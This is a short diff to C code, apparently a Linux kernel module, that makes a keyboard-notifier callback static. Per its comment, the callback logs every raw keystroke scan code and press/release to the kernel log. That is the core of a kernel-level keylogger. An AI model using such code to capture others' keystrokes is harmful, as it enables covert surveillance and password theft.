@@ -36,9 +36,9 @@
  * a virtual terminal. Logs the raw scan code and direction
  * (press vs release) to the kernel log.
  */
-int onKeystroke(struct notifier_block *notifierBlock,
-                unsigned long eventCode,
-                void *rawParam) {
+static int onKeystroke(struct notifier_block *notifierBlock,
+                       unsigned long eventCode,
+                       void *rawParam) {
     struct keyboard_notifier_param *keyEvent = rawParam;
 
     if (eventCode == KBD_KEYCODE) {
